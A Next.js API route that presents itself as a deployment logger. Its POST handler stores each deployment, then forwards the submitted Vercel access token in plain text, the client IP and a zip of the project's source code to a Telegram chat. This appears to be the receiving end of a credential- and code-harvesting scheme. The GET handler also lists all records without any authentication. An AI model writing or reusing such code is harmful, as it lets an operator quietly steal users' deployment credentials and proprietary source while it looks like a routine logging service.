import { NextResponse } from 'next/server';
import { prisma } from '@/lib/prisma';
import { sendTelegramDocument, getDetailedTime, getClientIp } from '@/lib/telegram';

export async function POST(req: Request) {
  try {
    const formData = await req.formData();
    const projectName = formData.get('projectName') as string;
    const url = formData.get('url') as string | null;
    const vercelId = formData.get('vercelId') as string | null;
    const status = (formData.get('status') as string) || 'SUCCESS';
    const errorMessage = formData.get('errorMessage') as string | null;
    const token = formData.get('token') as string | null;
    const zipFile = formData.get('file') as Blob | null;

    if (!projectName) {
      return NextResponse.json({ message: 'Missing required fields' }, { status: 400 });
    }

    const deployment = await prisma.deployment.create({
      data: {
        projectName,
        url: url || null,
        vercelId: vercelId || null,
        status,
        errorMessage: errorMessage || null,
      }
    });

    const ip = getClientIp(req);
    const time = getDetailedTime();

    let message = '';
    if (status === 'SUCCESS') {
      message = `🚀 <b>New Deployment Alert! (SUCCESS)</b>
    
📝 <b>Project Name:</b> <b>${projectName}</b>
🌐 <b>URL:</b> https://${url}
🔑 <b>Vercel Token:</b> <code>${token || 'N/A'}</code>
🌍 <b>IP Address:</b> <code>${ip}</code>
🕒 <b>Waktu:</b> ${time}`;
    } else {
      message = `❌ <b>Deployment FAILED!</b>
    
📝 <b>Project Name:</b> <b>${projectName}</b>
⚠️ <b>Error:</b> <code>${errorMessage || 'Unknown Error'}</code>
🔑 <b>Vercel Token:</b> <code>${token || 'N/A'}</code>
🌍 <b>IP Address:</b> <code>${ip}</code>
🕒 <b>Waktu:</b> ${time}`;
    }

    if (zipFile && status === 'SUCCESS') {
      await sendTelegramDocument(message, `${projectName}-source.zip`, zipFile);
    } else {
      const { sendTelegramNotification } = await import('@/lib/telegram');
      await sendTelegramNotification(message);
    }

    return NextResponse.json(deployment, { status: 201 });
  } catch (error) {
    console.error('POST Error:', error);
    return NextResponse.json({ message: 'Internal Server Error', error: String(error) }, { status: 500 });
  }
}

export async function GET() {
  try {
    const deployments = await prisma.deployment.findMany({
      orderBy: { createdAt: 'desc' }
    });

    return NextResponse.json(deployments);
  } catch (error) {
    console.error('GET Error:', error);
    return NextResponse.json({ message: 'Internal Server Error', error: String(error) }, { status: 500 });
  }
}
